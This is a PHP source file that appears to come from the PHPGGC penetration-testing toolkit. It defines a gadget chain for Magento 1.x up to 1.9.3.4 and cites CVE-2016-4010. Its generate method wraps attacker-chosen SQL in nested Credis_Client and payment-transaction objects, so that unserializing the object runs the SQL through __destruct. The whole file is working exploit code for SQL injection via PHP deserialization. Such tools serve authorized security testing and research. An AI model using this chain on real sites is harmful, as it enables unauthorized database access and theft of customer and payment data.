<?php

namespace GadgetChain\Magento;

# Reference: https://maxchadwick.xyz/blog/using-cve-2016-4010-gadget-chain-in-magento-1
class SQLI1 extends \PHPGGC\GadgetChain\SqlInjection
{
    public $version = '? <= 1.9.3.4';
    public $vector = '__destruct';
    public $author = 'mpchadwick';

    public function generate(array $params)
    {
        $sql = $params['sql'];

        return new \Credis_Client(
            new \Mage_Sales_Model_Order_Payment_Transaction(
                $sql
            )
        );
    }
}
